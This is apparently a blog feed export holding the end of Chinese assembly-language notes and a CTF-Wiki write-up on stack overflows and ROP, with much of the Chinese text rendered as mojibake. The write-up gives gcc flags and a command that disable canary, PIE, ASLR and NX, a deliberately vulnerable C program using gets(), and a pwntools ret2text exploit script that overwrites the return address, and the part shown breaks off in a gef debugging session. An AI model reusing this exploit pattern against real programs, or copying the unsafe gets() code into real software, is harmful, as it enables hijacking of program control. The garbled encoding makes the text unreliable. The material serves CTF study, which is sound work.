æ³•è¢«ç¼–è¯‘æˆæœºå™¨æŒ‡ä»¤è¢«CPUæ‰§è¡Œï¼Œç”±ç¼–è¯‘å™¨æ‰§è¡Œã€‚segmentså’Œendsæ˜¯ä¸€å¯¹æˆå¯¹ä½¿ç”¨çš„ä¼ªæŒ‡ä»¤ï¼Œè¿™æ˜¯åœ¨å†™å¯è¢«ç¼–è¯‘çš„æ±‡ç¼–ç¨‹åºæ—¶å¿…é¡»è¦ç”¨åˆ°çš„ä¼ªæŒ‡ä»¤ã€‚segmentå’Œendsçš„åŠŸèƒ½æ˜¯å®šä¹‰ä¸€ä¸ªæ®µï¼Œsegmentè¯´æ˜Žä¸€ä¸ªæ®µçš„å¼€å§‹ï¼Œendsè¯´æ˜Žä¸€ä¸ªæ®µçš„ç»“æŸã€‚ æ®µçš„ä½¿ç”¨æ ¼å¼ï¼šæ®µå segmentï¼š æ®µå ends43.ä¸€ä¸ªæ±‡ç¼–ç¨‹åºæ˜¯ç”±å¤šä¸ªæ®µç»„æˆçš„ï¼Œè¿™äº›æ®µè¢«ç”¨æ¥å­˜æ”¾ä»£ç ï¼Œæ•°æ®æˆ–è€…è¢«å½“ä½œæ ˆç©ºé—´ã€‚ä¸€ä¸ªæºç¨‹åºä¸­ï¼Œæ‰€æœ‰å°†è¢«è®¡ç®—æœºæ‰€å¤„ç†çš„ä¿¡æ¯å³æŒ‡ä»¤ï¼Œæ•°æ®ï¼Œæ ˆè¢«åˆ’åˆ†åˆ°ä¸åŒçš„æ®µã€‚44.endsä¸Žsegmentsé…å¯¹ä½¿ç”¨ï¼Œåˆ†åˆ«è¡¨ç¤ºæ®µçš„å¼€å§‹ä¸Žç»“æŸã€‚endä¸Žendsæ˜¯ä¸¤ä¸ªä¸åŒçš„æ¦‚å¿µï¼Œendæ˜¯æ•´ä¸ªç¨‹åºçš„ç»“æŸã€‚45.assumeæŒ‡ä»¤ï¼Œå°†æœ‰ç‰¹å®šç”¨é€”çš„æ®µä¸Žç›¸å…³çš„æ®µå¯„å­˜å™¨è”ç³»èµ·æ¥ã€‚æ¯”å¦‚ç”¨assumeæŒ‡ä»¤å°†ä»£ç æ®µä¸ŽCSè”ç³»èµ·æ¥ã€‚46.æºç¨‹åºï¼šæºç¨‹åºæ–‡ä»¶å½“ä¸­çš„æ‰€æœ‰å†…å®¹ã€‚ç¨‹åºï¼šæºç¨‹åºä¸­æœ€ç»ˆç”±è®¡ç®—æœºå¤„ç†çš„æŒ‡ä»¤æˆ–è€…æ•°æ®ã€‚47.ä¸ŽCè¯­è¨€ç±»ä¼¼ï¼Œæ±‡ç¼–ä¸­é™¤äº†æ±‡ç¼–æŒ‡ä»¤ï¼Œä¼ªæŒ‡ä»¤å¤–ï¼Œè¿˜æœ‰æ ‡å·ï¼ˆæ®µåï¼‰ä¼šåœ¨è¢«ç¼–è¯‘çš„æ—¶å€™ï¼Œè½¬å˜ä¸ºå†…å­˜åœ°å€ã€‚48.ç¨‹åºè¿”å›žï¼šä¸€æ®µæ±‡ç¼–æŒ‡ä»¤è¢«ç¼–è¯‘æˆæœºå™¨ç å‚¨å­˜åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œè¦æƒ³è¿è¡Œå¿…é¡»è½½å…¥å†…å­˜ã€‚åœ¨doså•ä¸ªä»»åŠ¡æ“ä½œç³»ç»Ÿä¸Šï¼Œå¿…é¡»å…ˆæœ‰æ­£åœ¨è¿è¡Œçš„ç¨‹åºP1ï¼Œå°†CPUçš„æŽ§åˆ¶æƒäº¤ç»™P2åŽï¼ŒP2æ‰å¾—ä»¥è¿è¡Œã€‚æ‰€ä»¥ä¸€ä¸ªç¨‹åºç»“æŸè¿è¡ŒåŽï¼Œå¿…é¡»å°†CPUæŽ§åˆ¶æƒäº¤ç»™ä¸‹ä¸€ä¸ªç¨‹åºï¼Œè¿™ä¸ªäº¤æ¢çš„è¿‡ç¨‹æˆä¸ºç¨‹åºè¿”å›žã€‚ä»£ç ï¼šmov axï¼Œ4c00Hint 21H49.æºç¨‹åºåœ¨ç¼–è¯‘çš„è¿‡ç¨‹ä¸­è¢«å‘çŽ°çš„é”™è¯¯ç§°ä¹‹ä¸ºè¯­æ³•é”™è¯¯ï¼Œç¼–è¯‘å®ŒæˆåŽæ‰§è¡Œæ—¶å‘ç”Ÿçš„é”™è¯¯ä¸ºé€»è¾‘é”™è¯¯ã€‚50.asmï¼Œæ±‡ç¼–æºç¨‹åºçš„æ‰©å±•åã€‚51.æºç¨‹åºè¢«ç¼–è¯‘åŽï¼Œå¯ä»¥å¾—åˆ°objï¼ˆç›®æ ‡æ–‡ä»¶ï¼‰/lstï¼ˆåˆ—è¡¨æ–‡ä»¶ï¼‰/crfï¼ˆäº¤å‰å¼•ç”¨æ–‡ä»¶ï¼‰52.53.è¦å®Œæ•´åœ°æè¿°ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œéœ€è¦ä¸¤ç§ä¿¡æ¯ã€‚ä¸€æ˜¯å†…å­˜å•å…ƒåœ°åœ°å€ï¼ŒäºŒæ˜¯å†…å­˜å•å…ƒå­˜å‚¨çš„é•¿åº¦ï¼ˆæ•°æ®ç±»åž‹ï¼‰ã€‚ç”¨[0]è¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒæ—¶ï¼Œ0è¡¨ç¤ºå•å…ƒçš„åç§»åœ°å€ï¼Œæ®µåœ°å€é»˜è®¤å­˜å‚¨åœ¨dsä¸­ï¼Œå•å…ƒçš„é•¿åº¦ç±»åž‹å¯ä»¥ç”±å…·ä½“æŒ‡ä»¤ä¸­çš„å…¶ä»–æ“ä½œå¯¹è±¡æ¯”å¦‚å¯„å­˜å™¨æŒ‡å‡ºã€‚ç±»ä¼¼çš„ï¼Œ[bx]ä¹Ÿè¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒï¼Œå…¶åç§»åœ°å€åœ¨bxä¸­ã€‚54.ï¼ˆbxï¼‰è¡¨ç¤ºbxä¸­çš„å†…å®¹ã€‚ ï¼ˆï¼‰ä¸­å¯ä»¥æœ‰ä¸‰ç§ç±»åž‹ï¼Œå¯„å­˜å™¨åï¼Œæ®µå¯„å­˜å™¨åï¼Œå†…å­˜å•å…ƒçš„ç‰©ç†åœ°å€ã€‚ ç”±æ­¤å¯çŸ¥ï¼Œï¼ˆXï¼‰ä¸­çš„æ•°æ®ç±»åž‹æœ‰ä¸¤ç§ï¼Œå­—æˆ–è€…å­—èŠ‚ã€‚ 15.æ³¨æ„pushä¸ŽpopæŒ‡ä»¤å¯¹spæ“ä½œçš„å…ˆåŽé¡ºåºã€‚56.[idata]ï¼Œè¡¨ç¤ºæ•°æ® 57.mov axï¼Œ[bx]è¡¨ç¤ºæŠŠbxä¸­å­˜æ”¾çš„æ•°æ®ä½œä¸ºä¸€ä¸ªåç§»åœ°å€EA,æ®µåœ°å€SAé»˜è®¤åœ¨dsä¸­ï¼Œå°†SA:EAå¤„çš„æ•°æ®é€å…¥axä¸­ã€‚mov [bx],axè¡¨ç¤ºæŠŠbxä¸­å­˜æ”¾çš„æ•°æ®ä½œä¸ºåç§»åœ°å€EAï¼Œæ®µåœ°å€SAé»˜è®¤åœ¨dsä¸­ï¼Œå°†axä¸­çš„æ•°æ®é€å…¥å†…å­˜SA:EAå¤„ã€‚58.incè¡¨ç¤ºè‡ªå¢žã€‚59.cxä¸ŽloopæŒ‡ä»¤ç›´æŽ¥å…³è”ï¼Œå­˜æ”¾å¾ªçŽ¯çš„æ¬¡æ•°ã€‚60.cxçš„ä½¿ç”¨ï¼šmov axï¼Œ2mov cxï¼Œ11sï¼šadd axï¼Œaxloop så¯è®¡ç®—2çš„12æ¬¡æ–¹61.åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼Œæ ‡å·ä»£è¡¨ä¸€ä¸ªåœ°å€ï¼Œæ­¤ç¨‹åºä¸­æœ‰ä¸€ä¸ªæ ‡å·ï¼ˆå¯ä»¥æ˜¯ä»»æ„å­—æ¯ï¼‰ï¼Œç”¨æ¥æ ‡è¯†ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€å¤„çš„æŒ‡ä»¤å°±æ˜¯æ‰€è¦å¾ªçŽ¯çš„æŒ‡ä»¤ã€‚62.èƒ½å¦å°†ffffï¼š0~ffffï¼šbä¸­çš„æ•°æ®ç›´æŽ¥ç´¯åŠ åˆ°dxä¸­ï¼Ÿä¸èƒ½ï¼Œç›´æŽ¥çš„ç´¯åŠ å¯¹ä½æ•°æœ‰è¦æ±‚ï¼Œç›¸åŒä½æ•°çš„æ‰èƒ½å¤Ÿç›´æŽ¥ç›¸åŠ ã€‚è§£å†³åŠžæ³•ï¼šå°†axä¸­çš„alå’Œahæ‹†åˆ†å¼€æ¥ç”¨ã€‚63.å‡ºçŽ°åœ¨è®¿é—®å†…å­˜å•å…ƒçš„æŒ‡ä»¤ä¸­ï¼Œç”¨äºŽæ˜¾å¼åœ°çŸ¥åå†…å­˜å•å…ƒçš„æ®µåœ°å€çš„dsï¼Œcsï¼Œssï¼Œesï¼Œåœ¨æ±‡ç¼–è¯­è¨€ä¸­ç§°ä¸ºæ®µå‰ç¼€ã€‚ä½¿ç”¨æ®µå‰ç¼€å¯ä»¥åœ¨æŸäº›æƒ…å†µä¸‹å‡å°‘ä»£ç çš„è¡Œæ•°ã€‚64.åœ¨ä¸èƒ½ç¡®å®šä¸€æ®µå†…å­˜ç©ºé—´ä¸­æ˜¯å¦å­˜æ”¾ç€é‡è¦çš„æ•°æ®æˆ–è€…ä»£ç çš„æ—¶å€™ï¼Œä¸èƒ½éšæ„ å‘å…¶ä¸­å†™å…¥å†…å®¹ã€‚Dosæ–¹å¼ä¸‹ï¼Œä¸€èˆ¬æƒ…å†µï¼Œ0ï¼š200Â·0ï¼š2ffç©ºé—´ä¸­æ²¡æœ‰ç³»ç»Ÿæˆ–è€…å…¶ä»–ç¨‹åºçš„æ•°æ®æˆ–è€…ä»£ç ã€‚65.lea, load effective address, åŠ è½½æœ‰æ•ˆåœ°å€. æŒ‡ä»¤å½¢å¼æ˜¯ä»Žå­˜å‚¨å™¨è¯»æ•°æ®åˆ°å¯„å­˜å™¨, æ•ˆæžœæ˜¯å°†å­˜å‚¨å™¨çš„æœ‰æ•ˆåœ°å€å†™å…¥åˆ°ç›®çš„æ“ä½œæ•°, ç®€å•è¯´, å°±æ˜¯Cè¯­è¨€ä¸­çš„â€&amp;â€.66.movs/movsb/movsw/movsd edi,esiè¿™äº›å˜ä½“ä»¥ä¸²/å­—èŠ‚/å­—/åŒå­—ä¸ºå•ä½ï¼Œå°†esiçš„å€¼èµ‹ç»™ediã€‚67.movsxç¬¦å·ä½æ‰©å±•ï¼Œbyte-&gt;wordï¼Œwordâ€“&gt;dwordï¼ˆæ‰©å±•åŽé«˜ä½å…¨ç”¨ç¬¦å·ä½å¡«å……ï¼‰ï¼Œç„¶åŽå®žçŽ°movã€‚68.movzxé›¶æ‰©å±•ï¼Œbyte-&gt;wordï¼Œword-&gt;dwordï¼ˆæ‰©å±•åŽé«˜ä½å…¨éƒ¨ç”¨é›¶å¡«å……ï¼‰ï¼Œç„¶åŽå®žçŽ°movã€‚69.CMPæŒ‡ä»¤æ ¹æ®æ¯”è¾ƒä¸¤ä¸ªæ“ä½œæ•°çš„ç»“æžœè®¾ç½®C/O/Zæ ‡å¿—ä½ã€‚è‹¥ä¸¤ä¸ªå¯„å­˜å™¨ä¸­çš„å€¼ç›¸ç­‰ï¼Œåˆ™Zæ ‡å¿—ä½ç½®1ï¼Œå¦åˆ™ç½®é›¶ã€‚ä¹Ÿå¯ä»¥ç›´æŽ¥ç”¨[åœ°å€]ä¸Žå¯„å­˜å™¨è¿›è¡Œæ¯”è¾ƒã€‚70.é€†å‘å·¥ç¨‹ä¸­å¸¸ç”¨çš„ä¸‰ä¸ªæ ‡å¿—ä½ï¼ŒC/O/Zï¼ŒCä¸ºè¿›ä½æ ‡å¿—ï¼Œè®°å½•è¿ç®—æ—¶ä»Žæœ€é«˜æœ‰æ•ˆä½äº§ç”Ÿçš„è¿›ä½å€¼ã€‚æ‰§è¡ŒåŠ æ³•è¿ç®—æ—¶ï¼Œæœ€é«˜æœ‰æ•ˆä½æœ‰è¿›ä½æ—¶ç½®1ï¼Œå¦åˆ™ç½®0.Oæ ‡å¿—ä½ï¼Œæº¢å‡ºæ ‡å¿—ï¼Œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¦‚æžœæ“ä½œæ•°è¶…å‡ºäº†æœºå™¨èƒ½è¡¨ç¤ºçš„èŒƒå›´åˆ™ç§°ä¸ºæº¢å‡ºï¼Œæº¢å‡ºç½®1ï¼Œæœªæº¢å‡ºç½®0.Zæ ‡å¿—ä½æœ€å¸¸ç”¨ï¼Œè¿ç®—ç»“æžœä¸º0æ—¶ï¼ŒZæ ‡å¿—ä½ç½®1ï¼Œå¦åˆ™ç½®0. 71.XORå¼‚æˆ–è¿ç®—ï¼Œå½“ä¸¤ä¸ªç»“æžœå­˜åœ¨ä¸åŒçš„æ—¶å€™è¿›è¡Œæˆ–è¿ç®—ï¼Œç›¸åŒçš„æ—¶å€™ä¿æŒä¸å˜ã€‚NOT,éžè¿ç®—ã€‚72.test destï¼ŒsrcæŒ‡ä»¤ï¼Œä¸ŽANDæŒ‡ä»¤ä¸€æ ·ï¼Œå¯¹ä¸¤ä¸ªæ“ä½œæ•°è¿›è¡ŒæŒ‰ä½çš„â€œä¸Žâ€è¿ç®—ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ä¸å°†ç»“æžœä¿å­˜åˆ°destï¼Œä¸å¯¹æ“ä½œæ•°çš„å†…å®¹è¿›è¡Œä¿®æ”¹ï¼Œåªä¿®æ”¹æ ‡å¿—ä½ã€‚å®žé™…æ“ä½œä¸­ï¼Œä¸€èˆ¬éƒ½æ˜¯test eaxï¼Œeaxï¼Œå¦‚æžœeaxçš„å€¼ä¸º0ï¼Œåˆ™Zæ ‡å¿—ä½ç½®1.73.å„ç§è·³è½¬åŠå…¶æ¡ä»¶ï¼šJMP æ— æ¡ä»¶è·³è½¬]]></content>
  </entry>
  <entry>
    <title><![CDATA[CTF-Wiki Stack Overflow and ROP]]></title>
    <url>%2F2019%2F06%2F20%2FCTF-Wiki%2F</url>
    <content type="text"><![CDATA[CTF-Wikiä¸­å‡ é“ä¾‹é¢˜çš„æ€è·¯ ä»Žæ ˆæº¢å‡ºçš„åŸºæœ¬åŽŸç†å¼€å§‹ï¼Œæ•´ç†ä¸‹CTF-Wikiä¸­å‡ é“ç»å…¸ä¾‹é¢˜(æº¢å‡ºæ–¹å¼)çš„æ€è·¯ã€‚ 0X01â€“æ ˆæº¢å‡ºçš„åŸºæœ¬åŽŸç†ï¼š æ ˆæº¢å‡ºæŒ‡çš„æ˜¯ç¨‹åºå‘æ ˆä¸­æŸä¸ªå˜é‡ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªå˜é‡æœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå› è€Œå¯¼è‡´ä¸Žå…¶ç›¸é‚»çš„æ ˆä¸­çš„å˜é‡çš„å€¼è¢«æ”¹å˜ã€‚è¿™ç§é—®é¢˜æ˜¯ä¸€ç§ç‰¹å®šçš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´žï¼Œç±»ä¼¼çš„è¿˜æœ‰å †æº¢å‡ºï¼Œbss æ®µæº¢å‡ºç­‰æº¢å‡ºæ–¹å¼ã€‚æ ˆæº¢å‡ºæ¼æ´žè½»åˆ™å¯ä»¥ä½¿ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯ä»¥ä½¿æ”»å‡»è€…æŽ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚å‘ç”Ÿæ ˆæº¢å‡ºçš„åŸºæœ¬å‰ææ˜¯:1.ç¨‹åºå¿…é¡»å‘æ ˆä¸Šå†™å…¥æ•°æ®ã€‚2.å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«å¾ˆå¥½åœ°æŽ§åˆ¶ã€‚ å‡½æ•°è°ƒç”¨æŒ‡ä»¤: CALL(æ³¨æ„ç†è§£EBPçš„å˜åŒ–è¿‡ç¨‹ï¼Œå®ƒæŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤è¦æ“ä½œçš„æ•°æ®) å¤§è‡´è¿‡ç¨‹: å‚æ•°å…¥æ ˆ è¿”å›žåœ°å€å…¥æ ˆ ä»£ç åŒºå—è·³è½¬ æ ˆå¸§è°ƒæ•´: ä¿å­˜å½“å‰æ ˆå¸§çš„çŠ¶æ€å€¼ï¼Œä¸ºäº†åŽé¢æ¢å¤æœ¬æ ˆå¸§æ—¶ä½¿ç”¨(EBPå…¥æ ˆ) å°†å½“å‰çš„æ ˆå¸§åˆ‡æ¢åˆ°æ–°æ ˆå¸§(ESPå€¼è£…å…¥EBPï¼Œæ›´æ–°æ ˆå¸§åº•éƒ¨) ç»™æ–°æ ˆå¸§åˆ†é…ç©ºé—´(ESPå‡åŽ»æ‰€éœ€è¦ç©ºé—´çš„å¤§å°ï¼ŒæŠ¬é«˜æ ˆé¡¶) 0X02â€“æ ˆæº¢å‡ºçš„ä¿æŠ¤ç±»åž‹ï¼š çŸ¥å·±çŸ¥å½¼ï¼Œæ–¹èƒ½ç™¾æˆ˜ä¸æ®†ã€‚åœ¨æ­£å¼å¼€å§‹æ ˆæº¢å‡ºä¹‹å‰ï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹ä¸€ä¸ªç¨‹åºåœ¨ç³»ç»Ÿä¸­æ‰€å—åˆ°çš„ä¿æŠ¤ç±»åž‹ï¼Œä¿æŠ¤ç±»åž‹å¯åœ¨terminalä¸­ç”¨checksec+æ–‡ä»¶åæŸ¥çœ‹ã€‚ Canaryï¼šå³å †æ ˆä¿æŠ¤ï¼Œä¸ç®¡æ˜¯è®¾è®¡è¿˜æ˜¯å®žçŽ°éƒ½æ¯”è¾ƒç®€å•é«˜æ•ˆï¼ŒåŽŸç†å°±æ˜¯æ’å…¥ä¸€ä¸ªå€¼ï¼Œåœ¨æ ˆæº¢å‡ºå‘ç”Ÿçš„é«˜å±åŒºåŸŸçš„å°¾éƒ¨ï¼Œå½“å‡½æ•°è¿”å›žæ—¶æ£€æµ‹canaryçš„å€¼æ˜¯å¦ç»è¿‡äº†æ”¹å˜ï¼Œä»¥æ­¤åˆ¤æ–­æ ˆæº¢å‡ºæ˜¯å¦å‘ç”Ÿ ã€‚å¦‚æžœå­˜åœ¨æº¢å‡ºå¯ä»¥è¦†ç›–ä½äºŽ TLS (å®‰å…¨ä¼ è¾“å±‚åè®®)ä¸­ä¿å­˜çš„ Canary å€¼é‚£ä¹ˆå°±å¯ä»¥å®žçŽ°ç»•è¿‡ä¿æŠ¤æœºåˆ¶ã€‚Canary è®¾è®¡ä¸ºä»¥å­—èŠ‚ \x00 ç»“å°¾ï¼Œæœ¬æ„æ˜¯ä¸ºäº†ä¿è¯ Canary å¯ä»¥æˆªæ–­å­—ç¬¦ä¸²ã€‚ æ³„éœ²æ ˆä¸­çš„ Canary çš„æ€è·¯æ˜¯è¦†ç›– Canary çš„ä½Žå­—èŠ‚ï¼Œæ¥æ‰“å°å‡ºå‰©ä½™çš„ Canary éƒ¨åˆ†ã€‚ è¿™ç§åˆ©ç”¨æ–¹å¼éœ€è¦å­˜åœ¨åˆé€‚çš„è¾“å‡ºå‡½æ•°ï¼Œå¹¶ä¸”å¯èƒ½éœ€è¦ç¬¬ä¸€æº¢å‡ºæ³„éœ² Canaryï¼Œä¹‹åŽå†æ¬¡æº¢å‡ºæŽ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚ç¼–è¯‘æ—¶çš„å…³é—­æŒ‡ä»¤ï¼š-fno-stack-protector ALSRä¸ŽPIE(Position Independent Executable)ï¼šåœ°å€éšæœºåŒ–ï¼ˆåœ¨ ASLR å…³é—­ã€PIE å¼€å¯æ—¶ä¹Ÿå¯ä»¥æ”»å‡»æˆåŠŸï¼‰ç¼–è¯‘æ—¶ALSRçš„å…³é—­æŒ‡ä»¤ï¼šecho 0&gt; /proc/sys/kernel/randomize_va_spaceå¯æ›´æ”¹Linux ç³»ç»Ÿçš„ ASLRçŠ¶æ€ï¼Œå¯ä»¥ç”¨cat+è·¯å¾„æ˜¾ç¤ºç›¸å…³çš„å‚æ•°ï¼š0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢žåŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚ PIEç¼–è¯‘æ—¶çš„å…³é—­æŒ‡ä»¤ï¼š-no-pieï¼Œä¸åŒ gcc ç‰ˆæœ¬å¯¹äºŽ PIE çš„é»˜è®¤é…ç½®ä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤gcc -væŸ¥çœ‹ gcc é»˜è®¤çš„å¼€å…³æƒ…å†µã€‚ Linuxå¹³å°ä¸‹çš„NX,Windowså¹³å°ä¸Šçš„DEPï¼šNXå³No-eXecuteï¼ˆå †æ ˆä¸å¯æ‰§è¡Œï¼‰ï¼ŒNXï¼ˆDEPï¼‰çš„åŸºæœ¬åŽŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡º,æˆåŠŸå†™å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯åŽ»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚ 0X03â€“ç¼–è¯‘æŒ‡ä»¤ï¼š gcc -m32(ç”Ÿæˆ32ä½ç¼–è¯‘ç¨‹åº) -fno-stack-protector(ä¸å¼€å¯æ ˆä¿æŠ¤ï¼Œå³ä¸ç”Ÿæˆcanaryï¼‰-no-pie(å…³é—­pieï¼‰ sudo -secho 0 &gt; /proc/sys/kernel/randomize_va_space ($ cat /proc/sys/kernel/randomize_va_spaceæŒ‡ä»¤æ£€æŸ¥)exitï¼ˆå…³é—­ALSR)-z execstackï¼ˆå…³é—­NXä¿æŠ¤ï¼‰ test.c -o test(ç”±test.cç”Ÿæˆtestå¯æ‰§è¡Œæ–‡ä»¶) -g(GDBè°ƒè¯•) 0X04â€“ROPåŽŸç†ï¼š éšç€ NX ä¿æŠ¤çš„å¼€å¯ï¼Œä»¥å¾€ç›´æŽ¥å‘æ ˆæˆ–è€…å †ä¸Šç›´æŽ¥æ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæžœã€‚æ”»å‡»è€…ä»¬ä¹Ÿæå‡ºæ¥ç›¸åº”çš„æ–¹æ³•æ¥ç»•è¿‡ä¿æŠ¤ï¼Œç›®å‰ä¸»è¦çš„æ˜¯ ROP(Return Oriented Programming)ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ (gadgets) æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»Žè€ŒæŽ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚æ‰€è°“ gadgets å°±æ˜¯ä»¥ ret ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æŽ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ä¹‹æ‰€ä»¥ç§°ä¹‹ä¸º ROPï¼Œæ˜¯å› ä¸ºæ ¸å¿ƒåœ¨äºŽåˆ©ç”¨äº†æŒ‡ä»¤é›†ä¸­çš„ ret æŒ‡ä»¤ï¼Œæ”¹å˜äº†æŒ‡ä»¤æµçš„æ‰§è¡Œé¡ºåºã€‚ROP æ”»å‡»ä¸€èˆ¬å¾—æ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼š ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æŽ§åˆ¶è¿”å›žåœ°å€ã€‚ å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ gadgets ä»¥åŠç›¸åº” gadgets çš„åœ°å€ã€‚ ropgadgetï¼Œæ³¨æ„å‘½ä»¤æ ¼å¼ï¼šROPgadget â€“binary [æ–‡ä»¶å] â€“onlyâ€™å¯„å­˜å™¨å|å¯„å­˜å™¨åâ€™ | grep â€˜eaxâ€™ã€‚ 0X05â€“å››ç§ç±»åž‹ï¼š ç¬¬ä¸€ç§ç±»åž‹ret2text: 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123; puts(â€œYou Hava already controlled it.â€); &#125;void vulnerable()&#123;char s[12];gets(s);puts(s);return;&#125;int main(int argc, char **argv) &#123;vulnerable();return 0;&#125; åªå¼€å¯äº†NX enabledï¼Œé¦–å…ˆæ‰¾åˆ°äº†gets()å‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´žã€‚ç„¶åŽæ ¹æ®char[]å¼€å¯çš„bufåœ°å€ï¼ˆEBP-0x14ï¼‰ï¼Œè®¡ç®—å‡ºè¦†ç›–åˆ°ret addrçš„è·ç¦»(bufçš„èµ·å§‹åœ°å€åˆ°EBPçš„é•¿åº¦)ï¼Œæž„é€ å‡ºpayload=0x14â€˜aâ€™+â€™bbbbâ€˜+p32ï¼ˆæƒ³è¦æ‰§è¡Œçš„å‡½æ•°åœ°å€ï¼‰ã€‚è¿™ç§ç±»åž‹åªè¯´æ˜Žé€šè¿‡æ ˆæº¢å‡ºå¯ä»¥æŽ§åˆ¶ç¨‹åºæµï¼Œå¹¶æ²¡æœ‰å®žé™…æ‹¿åˆ°shellï¼Œå±žäºŽç‰¹æ®Šæƒ…å†µã€‚ EXPå¦‚ä¸‹ï¼š 123456789101112131415##coding=utf8## å¯¼å…¥pwntoolsåº“from pwn import *## æž„é€ ä¸Žç¨‹åºäº¤äº’çš„å¯¹è±¡ï¼Œsh = process(&apos;./æ–‡ä»¶å&apos;)è¡¨ç¤ºæ‰“æœ¬åœ°ï¼Œæ—¥è‡ªå·±ã€‚sh = process(&apos;./stack_example&apos;)## å·²çŸ¥äº†æƒ³è¦æ‰§è¡Œçš„å‡½æ•°åœ°å€success_addr = 0x0804843b## æž„é€ payloadpayload = &apos;a&apos; * 0x14 + &apos;bbbb&apos; + p32(success_addr)##printå¯ä»¥å¸®åŠ©è‡ªå·±çœ‹è„šæœ¬æ‰§è¡Œåˆ°äº†å“ªä¸€æ­¥print p32(success_addr)## å‘ç¨‹åºå‘é€å­—ç¬¦ä¸²sh.sendline(payload)## å°†ä»£ç äº¤äº’è½¬æ¢ä¸ºæ‰‹å·¥äº¤äº’sh.interactive() 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets((char *)&amp;v4); printf(&quot;Maybe I will tell you next time !&quot;); return 0;&#125; é¦–å…ˆæ‰¾åˆ°äº†gets()å‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´žã€‚ç„¶åŽåœ¨secureå‡½æ•°ä¸­(ç»™å‡ºäº†å®Œæ•´çš„æ–‡ä»¶ï¼Œå†ç»è¿‡IDAåç¼–è¯‘)æ‰¾åˆ°äº†system(â€œ/bin/shâ€)çš„è°ƒç”¨(ä¸¤å¥ä»£ç )ã€‚é€šè¿‡æ”¹å˜è¿”å›žåœ°å€ç›´æŽ¥æ‰§è¡Œè¿™æ¡è¯­å¥ï¼Œå°±èƒ½æ‹¿åˆ°shellã€‚ å±žäºŽè¾ƒç®€å•çš„ROPï¼Œå› ä¸ºæ‹¿åˆ°shellçš„è¯­å¥ä½ç½®æ˜Žæ˜¾ï¼Œä»¥åŽæ‹¿åˆ°é¢˜å¯ä»¥ç›´æŽ¥Ctrl+Fè¯•è¯•è¿æ°”ï¼Œæˆ–è€…åˆ©ç”¨ ropgadgetï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰ /bin/sh å­˜åœ¨ã€‚ 123.text:080486A7 lea eax, [esp+1Ch].text:080486AB mov [esp], eax ; s.text:080486AE call _gets ç”±äºŽæ­¤å¤„åç¼–è¯‘æ˜¾ç¤ºï¼Œè¯¥ç¼“å†²åŒºçš„æœ€é«˜ç‚¹æ˜¯é€šè¿‡espç´¢å¼•çš„ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡è°ƒè¯•ï¼Œç¡®è®¤å…¶ç›¸å¯¹äºŽebpçš„åœ°å€ã€‚ 1234567891011121314151617gefâž¤ b *0x080486AEBreakpoint 1 at 0x80486ae: file ret2text.c, 